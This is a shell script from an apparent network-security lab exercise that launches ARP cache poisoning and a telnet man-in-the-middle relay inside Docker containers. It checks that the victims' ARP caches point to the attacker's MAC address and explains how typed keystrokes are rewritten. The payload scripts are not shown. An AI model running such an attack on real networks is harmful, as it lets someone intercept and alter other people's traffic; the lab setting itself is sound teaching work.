#!/bin/bash
# Task 2 -- MITM on telnet via ARP cache poisoning. Starts the attack; then telnet A->B.
set -u
cd "$(dirname "$0")" || exit 1

read -p "Enter weekly code (e.g. WK01-ASDK): " WK

wk() {
  local G=$'\033[01;32m' B=$'\033[01;34m' R=$'\033[00m'
  local PROMPT_DIRTRIM; PROMPT_DIRTRIM=$(sed -n 's/^[[:space:]]*PROMPT_DIRTRIM=\([0-9]\+\).*/\1/p' ~/.bashrc 2>/dev/null | tail -1)
  local w='\w'; w="${w@P}"
  printf '[%s]%s%s@%s%s:%s%s%s$ echo %s\n' "$(date +%D)" "$G" "$(whoami)" "$(hostname)" "$R" "$B" "$w" "$R" "$WK"
  echo "$WK"
}

A=A-10.9.0.5; B=B-10.9.0.6; M=M-10.9.0.105

docker exec $M pkill -f poison_both.py 2>/dev/null
docker exec $M pkill -f mitm.py 2>/dev/null
docker exec $A ping -c1 10.9.0.6 >/dev/null 2>&1
docker exec $B ping -c1 10.9.0.5 >/dev/null 2>&1

docker exec $M sysctl -w net.ipv4.ip_forward=0 >/dev/null
docker cp poison_both.py $M:/tmp/poison_both.py >/dev/null
docker cp mitm.py $M:/tmp/mitm.py >/dev/null
docker exec -d $M python3 /tmp/poison_both.py
docker exec -d $M python3 /tmp/mitm.py
echo "M: ip_forward=0, ARP poisoning + telnet MITM relay running. Waiting for caches..."
sleep 4

echo "A's cache for B and B's cache for A (should be M's MAC 02:42:0a:09:00:69):"
docker exec $A arp -n | grep 10.9.0.6
docker exec $B arp -n | grep 10.9.0.5

echo
echo "Attack is live. In another terminal on the VM:"
echo "  docksh $A"
echo "  telnet 10.9.0.6      # then type -- every letter you type reaches B as 'Z'"
echo "When finished: ./task2_stop.sh"
wk
